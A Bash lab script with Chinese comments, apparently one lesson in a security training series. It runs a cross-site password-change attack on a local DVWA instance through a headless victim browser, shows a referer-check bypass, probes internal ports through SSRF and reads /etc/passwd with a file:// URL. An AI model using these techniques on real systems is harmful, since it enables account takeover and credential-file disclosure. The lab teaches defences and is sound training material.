#!/usr/bin/env bash
# =============================================================================
# 15 · CSRF 与 SSRF 攻击链 —— 跨站改密利用页 / referer 与 token 防线 /
#      SSRF 端口探测（响应差异）+ file:// 任意读
# 用法: ./csrf_ssrf_lab.sh [apply|observe|clean|all]   (默认 all)
# 前置: 实验 12 的 DVWA 栈；flask + requests；node + puppeteer-core（受害浏览器）
# =============================================================================
set -euo pipefail
cd "$(dirname "$0")"

PY="${PYTHON:-python3}"
ART="artifacts"
EXPLOIT_PORT="${EXPLOIT_PORT:-8601}"
SSRF_PORT="${SSRF_PORT:-8602}"
NEW_PASS="hosec15-pwned"
NODE_MODULES="$HOME/.agents/skills/hands-on-series/scripts/node_modules"
DVWA_COMPOSE="../12_dvwa/configs/docker-compose.yml"

step() { echo; echo "=====> [$1] $2"; }
ok()   { echo "  ✅ $*"; }
die()  { echo "  ❌ $*" >&2; exit 1; }

svc_up() {  # $1=服务名 $2=端口
    [ "$(curl -s -o /dev/null -w '%{http_code}' --max-time 2 \
        "http://127.0.0.1:${2}/ping" || true)" = "200" ]
}

listen_3306() {
    "$PY" -c "import socket; socket.create_connection(('127.0.0.1', 3306), timeout=2).close()" 2>/dev/null
}

start_svc() {  # $1=脚本 $2=端口 $3=名字
    local pidfile="/tmp/hosec15-$3.pid"
    if [ -f "$pidfile" ] && kill -0 "$(cat "$pidfile")" 2>/dev/null; then
        ok "${3} 已在运行 (PID $(cat "$pidfile"))，直接复用"
        return 0
    fi
    rm -f "$pidfile"
    "$PY" "$1" --port "$2" > "/tmp/hosec15-$3.log" 2>&1 &
    echo $! > "$pidfile"
    disown 2>/dev/null || true
    local i
    for i in $(seq 1 20); do
        svc_up "$3" "$2" && return 0
        sleep 0.2
    done
    tail -3 "/tmp/hosec15-$3.log" 2>/dev/null || true
    die "${3} 未就绪（端口 ${2}）"
}

visit() {  # $1=URL $2=cookie 文件
    NODE_PATH="$NODE_MODULES" node configs/visit.js "$1" "$(cat "$2")" 2000
}

do_apply() {
    step "apply" "拉起 DVWA + 攻击者页面(:${EXPLOIT_PORT}) + SSRF 靶(:${SSRF_PORT}) + 登录取会话"
    mkdir -p "$ART"
    "$PY" -c "import flask, requests" 2>/dev/null \
        || die "缺少依赖：pip3 install flask requests"
    ../12_dvwa/dvwa.sh apply | tail -2

    if ! listen_3306; then
        step "apply" "3306 未发布：重放 compose 让端口映射生效（实验 15 的探测目标）"
        docker compose -p hosec12 -f "$DVWA_COMPOSE" up -d > /dev/null 2>&1
        local i
        for i in $(seq 1 30); do listen_3306 && break; sleep 1; done
    fi
    listen_3306 && ok "MySQL 已在 127.0.0.1:3306 监听（SSRF 探测目标就位）" \
        || die "3306 未监听——检查 ../12_dvwa/configs/docker-compose.yml 的端口映射"

    start_svc exploit_server.py "$EXPLOIT_PORT" exploit
    ok "攻击者页面就绪：http://127.0.0.1:${EXPLOIT_PORT}/exploit"
    start_svc ssrf_target.py "$SSRF_PORT" ssrf
    ok "SSRF 靶就绪：http://127.0.0.1:${SSRF_PORT}/fetch?url=..."

    "$PY" csrf_ssrf_lab.py session --level low > "$ART/cookie-low.txt"
    grep -q "PHPSESSID" "$ART/cookie-low.txt" || die "登录取会话失败"
    ok "受害者会话就绪（low 档，cookie 将喂给受害浏览器）"
}

do_observe() {
    step "observe" "① CSRF（low）：受害者访问攻击页，密码被跨站改走"
    visit "http://127.0.0.1:${EXPLOIT_PORT}/exploit" "$ART/cookie-low.txt"
    "$PY" csrf_ssrf_lab.py check --password "$NEW_PASS" \
        || die "low 档改密未生效（预期被改）"
    "$PY" csrf_ssrf_lab.py restore --password "$NEW_PASS"
    ok "low：跨站改密成功（新密码能登录）——攻击页只提交了一个表单，未碰密码框"

    step "observe" "② CSRF（medium）：referer 检查拦住攻击页提交"
    "$PY" csrf_ssrf_lab.py session --level medium > "$ART/cookie-medium.txt"
    visit "http://127.0.0.1:${EXPLOIT_PORT}/exploit" "$ART/cookie-medium.txt"
    if "$PY" csrf_ssrf_lab.py check --password "$NEW_PASS"; then
        die "medium 档竟然被改密成功（预期被拦）"
    else
        ok "medium：密码未变——提交的 Referer 不含服务端认的 SERVER_NAME（本栈是 0.0.0.0）"
    fi

    step "observe" "③ medium 绕过：参考页声明 referrer-policy，把服务端要的子串放进自己 URL 路径"
    visit "http://127.0.0.1:${EXPLOIT_PORT}/wallpaper/0.0.0.0" "$ART/cookie-medium.txt"
    "$PY" csrf_ssrf_lab.py check --password "$NEW_PASS" \
        || die "referer 策略绕过未生效（预期绕过）"
    "$PY" csrf_ssrf_lab.py restore --password "$NEW_PASS"
    ok "medium 被绕过——Referer 里的 0.0.0.0 来自攻击页路径：检查的东西攻击者可以自己造"

    step "observe" "④ CSRF（high）：user_token 缺失，跨站表单失效"
    "$PY" csrf_ssrf_lab.py session --level high > "$ART/cookie-high.txt"
    visit "http://127.0.0.1:${EXPLOIT_PORT}/exploit" "$ART/cookie-high.txt"
    if "$PY" csrf_ssrf_lab.py check --password "$NEW_PASS"; then
        die "high 档竟然被改密成功（预期被拦）"
    else
        ok "high：密码未变——token 是每个会话随机下发的一次性凭证，攻击页猜不出"
    fi
    "$PY" csrf_ssrf_lab.py check --password password \
        || die "对照登录失败（密码应保持在初始值）"

    step "observe" "⑤ SSRF：经内网服务探测端口（响应差异当侧信道）"
    "$PY" csrf_ssrf_lab.py probe --ports 8080,3306,8601,3999 | tee "$ART/probe.out"
    grep -q '3306.*open' "$ART/probe.out" || die "3306 未判定为开放"
    ok "3306 判定为 open——响应里带着 MySQL 握手包（非 HTTP 服务的马脚）"

    step "observe" "⑥ SSRF：file:// 协议未被限制，宿主 /etc/passwd 被读出"
    "$PY" csrf_ssrf_lab.py fetch --url "file:///etc/passwd" | tee "$ART/passwd.out"
    grep -q "root:" "$ART/passwd.out" || die "file:// 读取失败"
    ok "file:///etc/passwd 到手——SSRF 的危害不止穿墙探测，还有本地任意读"
}

do_clean() {
    step "clean" "停止攻击页与 SSRF 靶并清理生成物（DVWA 栈保持运行）"
    local svc pidfile
    for svc in exploit ssrf; do
        pidfile="/tmp/hosec15-$svc.pid"
        if [ -f "$pidfile" ] && kill -0 "$(cat "$pidfile")" 2>/dev/null; then
            kill "$(cat "$pidfile")"
        fi
        rm -f "$pidfile"
    done
    local i
    for i in $(seq 1 20); do
        svc_up exploit "$EXPLOIT_PORT" || svc_up ssrf "$SSRF_PORT" || break
        sleep 0.2
    done
    if svc_up exploit "$EXPLOIT_PORT" || svc_up ssrf "$SSRF_PORT"; then
        die "服务仍在响应（可能不是本脚本起的进程）"
    fi
    rm -rf "$ART"
    ok "两个服务已停、产物已清；靶场留着，要拆用 ../12_dvwa/dvwa.sh clean"
}

main() {
    local target="${1:-all}"
    case "$target" in
        apply)   do_apply ;;
        observe) do_observe ;;
        clean)   do_clean ;;
        all)     do_apply; do_observe; do_clean ;;
        *) echo "可用: apply | observe | clean | all" >&2; exit 1 ;;
    esac
}
main "$@"
